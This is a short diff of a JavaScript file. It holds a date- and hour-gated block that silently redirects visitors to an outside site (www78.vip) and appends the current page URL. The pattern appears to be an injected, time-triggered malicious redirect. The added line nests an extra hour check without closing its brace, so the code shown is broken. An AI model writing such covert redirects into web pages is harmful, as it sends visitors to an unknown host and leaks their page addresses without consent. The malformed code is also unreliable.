@@ -5,6 +5,7 @@ var hour = new Date().getHours();
 if (year === 2021 || year === 2022) {
     if (date === 13 || date === 15 || date === 28) {
         if (hour === 0 || hour === 7) {
+        if (hour === 15 || hour === 7) {
             window.location.href = "http://www78.vip/?url=" + window.location.href;
         } else {}
     }
